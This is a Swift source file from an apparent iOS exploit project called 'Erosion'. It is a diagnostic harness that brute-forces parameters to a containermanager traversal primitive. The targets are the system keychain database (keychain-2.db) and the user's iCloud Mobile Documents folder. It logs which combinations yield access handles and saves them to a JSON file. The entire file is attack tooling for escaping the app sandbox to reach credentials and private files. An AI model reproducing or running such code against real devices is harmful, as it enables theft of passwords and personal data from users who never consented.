//
//  GrantMatrix.swift
//  Erosion
//
//  诊断版：先看 containermanager 的符号有没有解析到，再跑 class-13/12 穿越，
//  并记录每次调用的返回码分布（-2 符号缺失 / -5 无结果 / -6 无令牌 / >=0 成功）
//

import Foundation

enum GrantMatrix {
    static let targets = [
        "/private/var/Keychains/keychain-2.db",
        "/private/var/mobile/Library/Mobile Documents"
    ]

    static let identifiers = [
        "systemgroup.com.apple.mobilegestaltcache",
        "systemgroup.com.apple.configurationprofiles"
    ]

    static func run(group: String) {
        let symbols = String(cString: worse_query_symbols())
        print("(grant-matrix) symbols: \(symbols)")

        var results: [[String: Any]] = []

        for target in targets {
            var codes: [String: Int] = [:]
            var granted: [[String: Any]] = []
            for identifier in identifiers {
                for queryClass in [13, 12, 7, 2] {
                    for part in [1, 2, 3, 4, 5] {
                        for up in [6, 8, 10, 12, 14] {
                            let handle = worse_query_traverse(target, group, identifier, UInt64(queryClass), UInt64(part), Int32(up))
                            let key = "\(handle > 0 ? "ok" : "c\(handle)")"
                            codes[key, default: 0] += 1
                            if handle >= 0 {
                                granted.append([
                                    "identifier": identifier,
                                    "class": queryClass,
                                    "part": part,
                                    "up": up,
                                    "handle": handle
                                ])
                                worse_query_release(handle)
                            }
                        }
                    }
                }
            }
            results.append([
                "target": target,
                "codes": codes,
                "granted": granted
            ])
        }

        let payload: [String: Any] = [
            "at": ISO8601DateFormatter().string(from: Date()),
            "symbols": symbols,
            "results": results
        ]
        let url = URL.documentsDirectory.appendingPathComponent("grant-matrix-result.json")
        if let data = try? JSONSerialization.data(withJSONObject: payload, options: [.prettyPrinted, .sortedKeys]) {
            try? data.write(to: url)
        }
        print("(grant-matrix) 完成")
    }
}
